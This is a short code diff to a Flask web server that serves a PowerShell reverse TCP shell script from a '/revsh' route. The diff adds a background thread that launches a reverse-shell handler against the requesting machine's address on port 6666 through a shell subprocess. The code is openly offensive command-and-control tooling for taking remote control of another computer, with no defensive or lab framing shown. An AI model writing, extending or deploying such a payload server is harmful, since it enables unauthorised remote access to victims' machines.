@@ -3,6 +3,8 @@
 from flask import *
 import base64
 import sys
+from threading import Thread
+import subprocess
 
 app = Flask('__main__')
 
@@ -24,7 +26,13 @@ def root():
 
 @app.route('/revsh', methods = ['GET'])
 def reverseShell():
+	p = Thread(target = revshell, args = (request.environ['REMOTE_ADDR'], 6666, ))
+	p.start()
 	return openFile('.', 'reverse_tcp_shell.ps1')
+
+# Start a new shell for reverse shell connection
+def revshell(ip, port):
+	subprocess.call('start /wait python revShHandler.py %s %d'%(ip, port), shell = True)
 
 if __name__ == '__main__':
 	app.run(port = 80, debug = True)
